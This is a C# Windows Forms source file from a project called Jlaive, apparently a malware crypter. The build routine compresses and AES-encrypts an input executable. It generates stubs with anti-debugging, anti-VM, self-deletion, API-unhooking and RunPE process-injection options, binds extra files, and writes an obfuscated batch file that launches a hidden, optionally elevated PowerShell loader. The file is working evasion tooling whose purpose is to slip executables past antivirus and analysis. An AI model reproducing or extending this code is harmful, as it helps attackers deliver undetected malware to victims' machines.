using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1() => InitializeComponent();

        private void Form1_Load(object sender, EventArgs e)
        {
            var obj = Settings.Load();
            if (obj != null) UnpackSettings(obj);
            UpdateKeys();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            var ofd = new OpenFileDialog { RestoreDirectory = true };
            if (ofd.ShowDialog() != DialogResult.OK) return;
            input.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists(input.Text))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (Path.GetExtension(input.Text) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            Crypt(input.Text, Convert.FromBase64String(key.Text), Convert.FromBase64String(iv.Text));
        }

        private void refreshKeys_Click(object sender, EventArgs e) => UpdateKeys();

        private void addFile_Click(object sender, EventArgs e)
        {
            var ofd = new OpenFileDialog { RestoreDirectory = true };
            if (ofd.ShowDialog() != DialogResult.OK) return;
            bindedFiles.Items.Add(ofd.FileName);
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            bindedFiles.Items.Remove(bindedFiles.SelectedItem);
        }

        private void Crypt(string input, byte[] key, byte[] iv)
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            log.Items.Clear();

            var stubgen = new StubGen(key, iv);
            var payload = File.ReadAllBytes(input);
            var isnetasm = IsAssembly(input);

            if (isnetasm)
            {
                log.Items.Add("Patching assembly...");
                Patcher.Fix(ref payload);
            }

            log.Items.Add("Compressing payload...");
            payload = Compress(payload);

            log.Items.Add("Creating stubs...");
            var stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
            var stub2 = stubgen.CreateBCS();

            log.Items.Add("Building stubs...");
            var compiler = new Compiler
            {
                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
                Resources = bindedFiles.Items.Cast<string>().ToArray()
            };
            var result = compiler.Build(stub);
            var stubbytes = result.AssemblyBytes;
            compiler = new Compiler
            {
                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }
            };
            result = compiler.Build(stub2);
            var stubbytes2 = result.AssemblyBytes;

            log.Items.Add("Embedding resources...");
            var embeddedresources = new List<PatcherResource>() { new PatcherResource("JLAIVE_P", payload) };
            if (!isnetasm)
            {
                embeddedresources.Add(new PatcherResource("JLAIVE_RP", Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll"))));
            }
            if (unhookAPI.Checked)
            {
                embeddedresources.Add(new PatcherResource("JLAIVE_AU", Compress(GetEmbeddedResource("Jlaive.Resources.apiunhooker.exe"))));
            }
            Patcher.AddResources(ref stubbytes, embeddedresources.ToArray());

            log.Items.Add("Encrypting stubs...");
            var stub_enc = Encrypt(Compress(stubbytes), key, iv);
            var stub2_enc = Encrypt(Compress(stubbytes2), key, iv);

            log.Items.Add("Creating PowerShell command...");
            var pscommand = stubgen.CreatePS();

            log.Items.Add("Creating batch file...");
            var content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);

            var sfd = new SaveFileDialog()
            {
                AddExtension = true,
                DefaultExt = "bat",
                Title = "Save File",
                Filter = "Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(input, "bat")
            };
            sfd.ShowDialog();

            log.Items.Add("Writing output...");
            File.WriteAllText(sfd.FileName, content, Encoding.ASCII);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            UpdateKeys();
            buildButton.Enabled = true;
        }

        private void UpdateKeys()
        {
            using (var aes = new AesManaged())
            {
                key.Text = Convert.ToBase64String(aes.Key);
                iv.Text = Convert.ToBase64String(aes.IV);
            }
        }

        private SettingsObject PackSettings()
        {
            return new SettingsObject()
            {
                InputFile = input.Text,
                AntiDebug = antiDebug.Checked,
                AntiVM = antiVM.Checked,
                SelfDelete = meltFile.Checked,
                Hidden = hidden.Checked,
                Runas = runas.Checked,
                ApiUnhook = unhookAPI.Checked,
                BindedFiles = bindedFiles.Items.Cast<string>().ToArray()
            };
        }

        private void UnpackSettings(SettingsObject obj)
        {
            input.Text = obj.InputFile;
            antiDebug.Checked = obj.AntiDebug;
            antiVM.Checked = obj.AntiVM;
            meltFile.Checked = obj.SelfDelete;
            hidden.Checked = obj.Hidden;
            runas.Checked = obj.Runas;
            unhookAPI.Checked = obj.ApiUnhook;
            bindedFiles.Items.AddRange(obj.BindedFiles);
        }
    }
}
